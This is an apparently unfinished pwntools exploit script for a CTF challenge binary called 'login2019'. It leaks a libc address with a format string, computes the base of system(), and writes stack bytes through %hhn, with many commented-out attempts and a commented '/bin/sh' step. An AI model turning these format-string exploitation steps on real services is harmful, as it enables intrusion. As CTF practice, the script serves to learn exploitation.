from pwn import *


def run():
    p = process('./login2019')
    # p = remote('node4.buuoj.cn', 29991)
    elf = ELF('./login2019')
    lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.27-3ubuntu1_i386/libc-2.27.so')
    # lib = ELF('../../pwn/libc/u18/libc-2.27-32.so')

    p.sendline(b'aaaa')
    payload = b'%15$p'
    p.sendline(payload)
    p.recvuntil(b'0x')
    start_main_addr = int(p.recv(8), 16) - 241
    base_addr = start_main_addr - lib.sym['__libc_start_main']
    print(hex(base_addr))
    system_addr = hex(base_addr + lib.sym['system'])
    print(system_addr)
    payload = b'%10$p'
    p.sendline(payload)
    p.recvuntil(b'0x')
    addr = int(p.recv(8)[-2:], 16)

    payload = '%' + str(addr - 4) + 'c%6$hhn'
    p.sendline(payload)
    payload = b'%22c%10$hnn'
    p.sendline(payload)
    #
    # payload = '%' + str(addr - 3) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%176c%10$hnn'
    # p.sendline(payload)
    #
    # payload = '%' + str(addr - 2) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%4c%10$hnn'
    # p.sendline(payload)
    #
    # payload = '%' + str(addr - 1) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%8c%10$hnn'
    # p.sendline(payload)

    # payload = '%' + str(addr) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%20c%10$hnn'
    # p.sendline(payload)

    # payload = '%' + str(addr + 1) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%176c%10$hnn'
    # p.sendline(payload)
    #
    # payload = '%' + str(addr + 2) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%4c%10$hnn'
    # p.sendline(payload)
    #
    # payload = '%' + str(addr + 3) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%8c%10$hnn'
    # p.sendline(payload)
    #
    # payload = '%' + str(addr) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%21c%10$hnn'
    # p.sendline(payload)

    # payload = '%' + str(addr + 1) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%176c%10$hnn'
    # p.sendline(payload)
    #
    # payload = '%' + str(addr + 2) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%4c%10$hnn'
    # p.sendline(payload)
    #
    # payload = '%' + str(addr + 3) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%8c%10$hnn'
    # p.sendline(payload)

    # payload = '%' + str(addr + 16) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%20c%10$hnn'
    # p.sendline(payload)
    #
    # payload = '%' + str(addr + 17) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%176c%10$hnn'
    # p.sendline(payload)
    #
    # payload = '%' + str(addr + 18) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%4c%10$hnn'
    # p.sendline(payload)
    #
    # payload = '%' + str(addr + 19) + 'c%6$hhn'
    # p.sendline(payload)
    # payload = b'%8c%10$hnn'
    # p.sendline(payload)

    # addr_1 = int(system_addr[-2:], 16)
    # addr_2 = int(system_addr[-4:-2], 16)
    # addr_3 = int(system_addr[-6:-4], 16)
    # print(hex(addr_1))
    # print(hex(addr_2))
    # print(hex(addr_3))
    # if addr_3 - addr_2 <= 0 or addr_2 - addr_1 <= 0 :
    #     p.close()
    #     return 0
    # if addr_1 == 0:
    #     payload = '%18$hhn%' + str(addr_2) + 'c%14$hhn%' + str(addr_3 - addr_2) + 'c%13$hhn'
    # else:
    #     payload = '%' + str(addr_1) + 'c%18$hhn%' + str(addr_2 - addr_1) + 'c%14$hhn%' + str(
    #         addr_3 - addr_2) + 'c%13$hhn'
    # print(payload)
    p.sendline(b'%13$p')
    gdb.attach(p)
    # try:
    #     p.sendline(payload)
    # except:
    #     p.close()
    #     return 0
    # p.sendline(b'/bin/sh')
    p.interactive()
    # p.sendline(b'cat flag')
    # gdb.attach(p)



if __name__ == '__main__':
    run()